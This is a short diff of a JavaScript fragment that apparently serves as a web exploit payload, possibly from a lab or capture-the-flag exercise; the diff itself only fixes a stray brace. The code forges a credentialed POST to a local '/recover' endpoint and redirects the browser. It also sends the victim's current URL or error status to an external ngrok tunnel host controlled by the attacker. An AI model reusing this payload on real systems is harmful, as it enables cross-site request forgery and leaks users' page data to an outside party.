@@ -25,4 +25,4 @@ if (window.location.search === "?x") {
     fetch('http://localhost:3000/recover', {method: 'POST', body: d, credentials: 'same-origin'}).then(x => window.location = 'http://localhost:3000/documents').catch(x => window.location = 'http://04e3f05d.ngrok.io/?x=fail-'+x.status);
 } else {
   window.location = "http://04e3f05d.ngrok.io/?x="+window.location.href;
-/}
+}
